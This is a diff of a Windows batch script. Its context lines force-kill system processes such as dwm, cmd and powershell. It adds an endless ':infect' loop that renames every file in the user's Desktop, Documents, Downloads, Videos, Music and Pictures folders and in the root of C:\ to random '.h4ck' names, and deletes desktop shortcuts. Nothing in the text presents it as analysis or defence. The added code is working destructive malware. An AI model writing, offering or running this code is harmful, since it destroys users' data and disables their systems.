@@ -27,5 +27,23 @@ taskkill /f /im taskhost.exe >nul 2>&1
 taskkill /f /im dwm.exe >nul 2>&1
 taskkill /f /im cmd.exe >nul 2>&1
 taskkill /f /im powershell.exe >nul 2>&1
-timeout /t 1 /nobreak >nul
-goto killloop
+
+:infect
+cd %userprofile%\desktop
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\documents
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\downloads
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\videos
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\music
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\pictures
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+cd %userprofile%\desktop
+for %%f in (*.lnk) do (del "%%f" 2>nul)
+cd C:\
+for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
+timeout /t 2 /nobreak >nul
+goto infect
